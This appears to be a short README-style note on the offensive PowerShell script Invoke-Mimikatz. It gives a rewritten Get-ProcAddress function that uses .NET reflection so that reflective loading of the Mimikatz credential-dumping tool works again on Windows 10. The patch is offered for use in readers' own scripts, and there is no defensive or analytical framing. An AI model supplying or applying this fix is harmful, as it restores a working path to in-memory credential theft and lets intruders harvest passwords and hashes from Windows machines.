# Invoke-Mimikatz.ps1

So basically unless you have bleeding edge powersploit right now, then Reflective Mimikatz wont work on **Windows 10**, however with a little change to the 'Get-ProcAddress' function you can get it working. Basically within Windows 10 the function now takes two arguments ^.\^
> Here's the function change if you want to add it into any of your own scripts.

    Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') };
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods');
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle');
        #Deal with the fact that windows now has two of these, we'll select the second one
        $x=$($UnsafeNativeMethods.GetMethods() | where-object {$_.name -eq "getprocaddress"});

        if(Get-Member -InputObject $x -Name Length -MemberType Properties) {
            write-host $x | format-table
            $GetProcAddress = $x[1];
        } else {
            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        }
            
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
